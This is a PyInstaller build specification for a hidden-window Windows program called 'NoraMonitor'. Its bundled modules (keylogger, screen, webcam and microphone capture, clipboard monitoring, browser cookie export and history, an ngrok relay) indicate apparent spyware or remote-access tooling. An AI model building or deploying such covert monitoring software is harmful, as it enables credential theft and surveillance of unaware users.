# -*- mode: python ; coding: utf-8 -*-
import os
import glob
from PyInstaller.utils.hooks import collect_all, collect_data_files

block_cipher = None

# ── Collect everything for packages with heavy dynamic imports ────────────────
_datas    = []
_binaries = []
_hidden   = []

for _pkg in [
    'flask', 'flask_socketio', 'engineio', 'socketio',
    'jinja2', 'werkzeug', 'click', 'itsdangerous', 'markupsafe',
    'pynput', 'cv2', 'PIL',
    'webview', 'pywebview',
    'Cryptodome',
    'mss',
]:
    try:
        d, b, h = collect_all(_pkg)
        _datas    += d
        _binaries += b
        _hidden   += h
    except Exception:
        pass

# SSL certificates — needed by requests / pyngrok / updater
_datas += collect_data_files('certifi')

# sounddevice ships portaudio DLL as package data on Windows
try:
    _datas += collect_data_files('sounddevice')
except Exception:
    pass

# pyaudio portaudio DLL (bundled inside the wheel on Windows)
try:
    _datas += collect_data_files('pyaudio')
except Exception:
    pass

# ── Tesseract-OCR binaries (installed by CI via choco) ───────────────────────
_TESS_ROOTS = [
    r'C:\Program Files\Tesseract-OCR',
    r'C:\Program Files (x86)\Tesseract-OCR',
]
for _root in _TESS_ROOTS:
    if os.path.isdir(_root):
        # Main exe
        _tbin = os.path.join(_root, 'tesseract.exe')
        if os.path.isfile(_tbin):
            _binaries.append((_tbin, '.'))
        # DLLs tesseract needs
        for _dll in glob.glob(os.path.join(_root, '*.dll')):
            _binaries.append((_dll, '.'))
        # Language data — bundle English only to keep size down;
        # other lang files can be dropped into tessdata/ beside the exe later
        _tdata = os.path.join(_root, 'tessdata')
        if os.path.isdir(_tdata):
            for _td in glob.glob(os.path.join(_tdata, 'eng.*')):
                _datas.append((_td, 'tessdata'))
            # also include config files
            _tcfg = os.path.join(_tdata, 'configs')
            if os.path.isdir(_tcfg):
                _datas.append((_tcfg, os.path.join('tessdata', 'configs')))
        break

# ── Analysis ──────────────────────────────────────────────────────────────────
a = Analysis(
    ['app.py'],
    pathex=[],
    binaries=_binaries,
    datas=[
        ('templates/viewer.html', 'templates'),
    ] + _datas,
    hiddenimports=_hidden + [
        # Flask / SocketIO (belt-and-suspenders on top of collect_all)
        'flask_socketio',
        'engineio',
        'engineio.async_drivers',
        'engineio.async_drivers.threading',
        'socketio',
        'socketio.exceptions',
        # pynput Windows backend
        'pynput',
        'pynput.keyboard',
        'pynput.keyboard._win32',
        'pynput.mouse',
        'pynput.mouse._win32',
        # pywin32
        'win32api', 'win32con', 'win32gui',
        'win32process', 'win32security', 'win32crypt',
        'winerror', 'pywintypes',
        # crypto
        'Cryptodome', 'Cryptodome.Cipher', 'Cryptodome.Cipher.AES',
        'Cryptodome.Protocol', 'Cryptodome.Protocol.KDF',
        # image / screen capture
        'mss', 'mss.windows',
        'cv2', 'numpy',
        'PIL', 'PIL.Image', 'PIL.ImageTk', 'PIL.ImageDraw',
        # audio
        'pyaudio', 'sounddevice',
        # misc stdlib / third-party
        'psutil', 'pyperclip', 'pyngrok',
        'sqlite3', 'pyautogui', 'requests',
        'configparser', 'pytesseract',
        # project modules
        'keylogger', 'screencap', 'controller', 'recorder',
        'camera', 'clipboard_monitor', 'microphone',
        'relay_client', 'server',
        'export_cookies', 'import_cookies', 'sysinfo',
        'browser_history', 'wintools',
        'privacy_screen', 'webview', 'webview.platforms.winforms',
        'updater',
    ],
    hookspath=[],
    runtime_hooks=['rthook_tess.py'],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='NoraMonitor',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    # Don't UPX-compress DLLs — UPX can corrupt certain signed DLLs
    upx_exclude=['vcruntime140.dll', 'python3*.dll', 'cv2*.pyd',
                 '_sounddevice*.pyd', 'tesseract.exe', '*.dll'],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None,
)
